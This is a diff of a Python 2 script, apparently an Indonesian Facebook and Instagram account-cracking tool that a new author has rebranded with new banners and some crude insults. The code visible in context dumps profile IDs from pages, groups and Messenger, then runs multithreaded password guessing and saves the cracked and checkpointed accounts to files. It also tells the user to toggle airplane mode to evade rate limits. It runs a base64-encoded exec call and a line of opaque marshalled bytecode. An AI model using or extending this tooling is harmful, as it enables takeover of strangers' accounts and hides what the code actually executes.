@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 # coding=utf-8
-# Mengrecode Script orang tidak membuatmu menjadi master
-# Script Ini Jan di otak-atik lagi udah enak soal ny
-# pengen recode? Kasih dulu Bintang nya om/tante 
+# Merecode Alat Orang Tidak akan membuatmu jadi master
+# Alat Ini Akan Menjadi Error apabila ada yang diubah
+# Bakekok Berhasil Di Dec Pengen Recode ya? 
 
 Hj = '\x1b[1;92m' 
 Mt = '\x1b[0m' 
@@ -10,12 +10,12 @@ ingfo = (
 """%s
  • Informasi Alat :
  	
- - Developer   : BINTANG-XD-Romi Afrizal
- - Facebook    : Bintang Tyz
- - Yutube      : BINTANG XD
- - Github      : Github.com/bot-85
- - Tool name   : lion of diyour
- - Version     : 1.2 (BETA) "In Development
+ - Developer   : Ramdhan Ramadhian XD
+ - Facebook    : Facebook.com/105805581664563
+ - Instagram   : ramdhan.ramadhian99
+ - Github      : Github.com/Ramdhan7
+ - Tool name   : Crackah The Master Crack
+ - Version     : 1.0 (BETA) "In Development
  
 %s"""%(Hj,Mt))
 import os
@@ -57,21 +57,31 @@ def folder():
 		open("data/ua.txt","w").write(ua_)
 	except:
 		pass
-### BAGIAN LOGO ###
-def logo():
-	os.system("clear")
-	print("""%s
-\x1b[1;91m___________          _____ _____________________
-\x1b[1;92m\_   _____/         /     \\______   \_   _____/
-\x1b[1;93m |    __)  ______  /  \ /  \|    |  _/|    __)  
-\x1b[1;94m |    |   /_____/ /    Y    \    |   \|     \   
-\x1b[1;95m \___ |           \____|__  /______  /\___  /   
-\x1b[1;96m     \/                   \/       \/     \/      """%(N))   
+# LOGO (LO GOBLOK)
+IP = requests.get("https://api.ipify.org/").text
+def banner():
+	print (""" 
+\x1b[1;93m•\x1b[1;92mFuck \x1b[1;97m- \x1b[1;92mMulti Brute Force\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•
+\x1b[1;93m•\x1b[1;91m ___________          _____ _____________________ \x1b[1;93m•
+\x1b[1;93m•\x1b[1;92m \_   _____/         /     \\______   \_   _____/  \x1b[1;93m•
+\x1b[1;93m•\x1b[1;93m  |    __)  ______  /  \ /  \|    |  _/|    __)   \x1b[1;93m•
+\x1b[1;93m•\x1b[1;94m  |     \  /_____/ /    Y    \    |   \|     \    \x1b[1;93m•
+\x1b[1;93m•\x1b[1;95m  \___  /          \____|__  /______  /\___  /    \x1b[1;93m•    
+\x1b[1;93m•\x1b[1;96m      \/                   \/       \/     \/     \x1b[1;93m•
+\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;93m•\x1b[1;92mFuck \x1b[1;97m- \x1b[1;92mMulti Brute Force\x1b[1;93m•
+
+\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mCreated By \x1b[1;97m: \x1b[1;93mO\x1b[1;97m'\x1b[1;93mHayo \x1b[1;97mX \x1b[1;93mDitzy
+\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mFb         \x1b[1;97m: \x1b[1;93mhttps://www.facebook.com/rendi.gerot.1
+\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mGh         \x1b[1;97m: \x1b[1;93mhttps://github.com/YumasaaTzy
+\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWa         \x1b[1;97m: \x1b[1;93m+628380192xxxx
+\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;97m: \x1b[1;93mDitzy \x1b[1;97mX \x1b[1;93mO\x1b[1;97m'\x1b[1;93mHayo 
+""")
+
 # MASUK TOKEN
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def masuk():
     os.system('clear');banner()
-    print ('\n%s [01] Masuk Via Token \n [02] Tutorial Mengambil token \n [%s00%s] Keluar'%(P,M,P))
+    print ('\n%s [01] Masuk Token \n [02] Cara Memakai Alat \n [%s00%s] Keluar'%(P,M,P))
     rom = raw_input('\n%s [?] Menu : %s'%(P,K))
     if rom in(""):
     	print("%s [!] Isi yang benar "%(M));exit()
@@ -82,25 +92,25 @@ def masuk():
         	print("%s [!] Isilah dengan cinta "%(M));exit()
     	try:
             gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
-            print ('\n%s[√] Login berhasil. '%(H));jeda(2)
+            print ('\n%s[√] Login bisa, tunggulah '%(H));jeda(2)
             open('token.txt', 'w').write(romz);login_xx()
             exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
         except (KeyError,IOError):
         	print("%s [!] Token invalid "%(M));masuk()
     elif rom in ('2', '02'):
-    	print ("\n%s%s Ikuti langkah langkah sebagai berikut"%(H,til));jeda(2)
-        print (" - pertama masuk Google chrome, Usahkan akun tumbal ");jeda(2)
-        print (" - sihlahkan ketik %sm.facebook %s"%(O,K));jeda(2)
-        print (" - Terus cari titik tiga yang diatas lalu ketik %sEAAA %sLalu cari)"%(O,H));jeda(2)
-        print (" - klo sudah ketemu lalu Di %ssalin dan tempel di Script ini "%(O));jeda(2)
-        print ("%s - paham kan klo paham ketik Y klo ga paham ketik N "%(H));jeda(2)
-        nanya = raw_input('%s [?] Paham Gak ?[%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
+    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
+        print (" - Masuk Token Menggunakan Akun Tumbal");jeda(2)
+        print (" - Pilih Salah Satu Menu Crack Facebook Untuk %sDump %s"%(O,K));jeda(2)
+        print (" - Salin File Dump %sMisalnya Itu %sDump/Kontol.json)"%(O,H));jeda(2)
+        print (" - Pilih Menu No 5 Nanti kalo diminta %sFile tempellah Dump/Blabla.json tadi"%(O));jeda(2)
+        print ("%s - Seterusnya Sudah Diterangkan Di Alat "%(H));jeda(2)
+        nanya = raw_input('%s [?] Ngerti Gak ?[%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
         if nanya in(""):
         	print ("%s [!] Ayo dijawab kalo gak ngerti kasitau "%(M));jeda(2);masuk()
         elif nanya in("y","Y"):
-        	print ("\n%s [√] Tumben paham lu :* "%(H));jeda(2);masuk()
+        	print ("\n%s [√] Nah Tuh Paham Mulai Crack sono! :* "%(H));jeda(2);masuk()
         elif nanya in("n","N"):
-        	print ("\n%s [!] Anak Tolol!! "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
+        	print ("\n%s [!] Memek Lah,Minta Digetok lu ? "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
     elif rom in ('0', '00'):
     	exit('\n')
     else:
@@ -200,7 +210,7 @@ class ngentod:
             raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
         unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(P,K))
         if unikers in ('Y', 'y'):
-            print '\n %s[%s!%s] cth : %ssayang,anjing,jancok.%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
+            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
             while True:
                 pwx = raw_input(' %s[?] set password :%s '%(P,K))
                 if pwx == '':
@@ -215,7 +225,7 @@ class ngentod:
                         elif ind in ('1', '01'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] Matikan data untuk memperhambat crack\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] Hidupkan Mode Pesawat 5 Detik Setiap 7 Menit\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -226,7 +236,7 @@ class ngentod:
                         elif ind in ('2', '02'):
                             print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] Matikan data untuk memperhambat crack\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] Hidupkan Mode Pesawat 5 Detik Setiap 7 Menit\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -237,7 +247,7 @@ class ngentod:
                         elif ind in ('3', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] Matikan data untuk memperhambat crack\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] Hidupkan Mode Pesawat 5 Detik Setiap 7 Menit\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -268,7 +278,7 @@ class ngentod:
         elif suuu in ('1', '01'):
             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s [%s!%s] Matikan data untuk memperhambat crack\n'%(P,M,P);jeda(0.2)
+            print '%s [%s!%s] Hidupkan Mode Pesawat 5 Detik Setiap 7 Menit\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -284,7 +294,7 @@ class ngentod:
         elif suuu in ('2', '02'):
             print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s [%s!%s] Matikan data untuk memperhambat crack\n'%(P,M,P);jeda(0.2)
+            print '%s [%s!%s] Hidupkan Mode Pesawat 5 Detik Setiap 7 Menit\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -300,7 +310,7 @@ class ngentod:
         elif suuu in ('3', '03'):
             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s [%s!%s] Matikan data untuk memperhambat crack\n'%(P,M,P);jeda(0.2)
+            print '%s [%s!%s] Hidupkan Mode Pesawat 5 Detik Setiap 7 Menit\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -574,7 +584,7 @@ def uas():
     if u == '':
         print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
     elif u in("1","01"):
-    	print (" %s[%s*%s] ketik %sMy user agent%s di browser, google, chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
+    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
     	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
     	try:
     	    ua = raw_input("%s [?] user agent : %s"%(P,K))
@@ -720,7 +730,7 @@ def dumpfl():
         if new == True:
             open('data/cookies', 'w').write(cookie)
         sim=raw_input("\n%s%s%s Nama file %s>%s "%(U,til,O,M,K)).replace(" ","_")
-        print ("%s%s%s Example nama orang %s[ %sBintang XD %s]"%(U,til,O,P,H,P))
+        print ("%s%s%s Example nama orang %s[ %sRamdhanRamadhian %s]"%(U,til,O,P,H,P))
         s=raw_input("%s%s%s Sett nama %s> %s"%(U,til,O,M,K))
         if s in("romi","Romi","ROMI","Romi Afrizal","Romi afrizal","ROMI AFRIZAL","romi afrizal"):
         	print("\n%s%s anak anjing mau crack pake nama gw "%(M,til));exit()
@@ -879,25 +889,25 @@ def menu():
         print("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
     except requests.exceptions.ConnectionError:
         exit("%s [!] Kesalahan koneksi "%(M))
-    logo()
-    print ('\n %s[ Selamat Datang %s%s%s ] \n'%(P,H,nama,P))
-    print (' [%s01%s]. Crack Nama Ig/Instagram'%(O,U)) 
-    print (' [%s02%s]. Dump Id Facebook Publik'%(O,K)) 
-    print (' [%s03%s]. Dump Id Facebook Follow'%(O,U))
-    print (' [%s04%s]. Dump Id Facebook Postingan'%(O,B))
-    print (' [%s05%s]. Dump Id Facebook Nama'%(P,H))
-    print (' [%s06%s]. Dump Id Facebook Group'%(O,B))
-    print (' [%s07%s]. Dump Id Facebook Pesan Mesengger'%(O,H))
-    print (' [%s08%s]. %sMemulai Crack/Start crack %s'%(O,P,M,P)) 
-    print (' [%s09%s]. Settings User Agent'%(O,K)) 
-    print (' [%s10%s]. Check Pendapatan Akun'%(O,B))
-    print (' [%s11%s]. Check Hasil Chekpoint/Opsi CP'%(O,H))
-    #print (' [%s12%s]. Gabung group'%(O,P))
-    #print (' [%s13%s]. Informasi Alat'%(O,P))
-    print (' [%s00%s]. Log Out '%(M,P))
-    unik = raw_input('\n%s [*.] Pilih : %s'%(M,P))
+    banner()
+    print ('\n %s[ Akulah %s%s%s ] \n'%(P,H,nama,P))
+    print (' (%s01%s) Instagram Crack Nama'%(O,U)) 
+    print (' (%s02%s) Facebook Dump Publik'%(O,P)) 
+    print (' (%s03%s) Facebook Dump Follow'%(O,P))
+    print (' (%s04%s) Facebook Dump Postingan '%(O,P))
+    print (' (%s05%s) Facebook Dump Nama'%(O,P))
+    print (' (%s06%s) Facebook Dump Group'%(O,P))
+    print (' (%s07%s) Facebook Dump Pesan Mesengger'%(O,P))
+    print (' (%s08%s) %sMemulai Operasi Crack %s'%(O,P,M,P)) 
+    print (' (%s09%s) User Agent'%(O,K)) 
+    print (' (%s10%s) Memeriksa Pendapatan Akun'%(O,B))
+    print (' (%s11%s) Memeriksa Jenis Chekpoint/Opsi CP'%(O,H))
+    #print (' (%s12%s) Gabung group'%(O,P))
+    #print (' (%s13%s) Informasi Alat'%(O,P))
+    print (' (%s00%s) Log Out '%(P,H))
+    unik = raw_input('\n%s [!] Menu : %s'%(P,O))
     if unik == '':
-        print("%s [!] Isi yang benar!!  "%(M));jeda(2);Pilih()
+        print("%s [!] Isilah Dengan Cinta "%(M));jeda(2);menu()
     elif unik in['1','01']:
         igg()
     elif unik in['2','02']:
@@ -917,15 +927,12 @@ def menu():
     elif unik in['9','09']:
     	useragent()
     elif unik in['10','10']:
-        opsi()
-    elif unik in['11','11']:
-        file_cp()
-
-def opsi():
     	print "\n%s [01] Pendapatan Facebook "%(P)
         print "%s [02] Pendapatan Instagram "%(P)
         c = raw_input('\n%s [?] Menu : %s'%(P,O))
     	hasill(c)
+    elif unik in['11','11']: 
+        file_cp() 
     elif unik in['8','11']:
         os.system("xdg-open https://www.facebook.com/groups/924679595149360")
     elif unik in['9','10']:
@@ -1053,4 +1060,4 @@ _=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00
 if __name__ == '__main__':
     os.system('git pull')
     folder()
-    menu()    
+    menu()
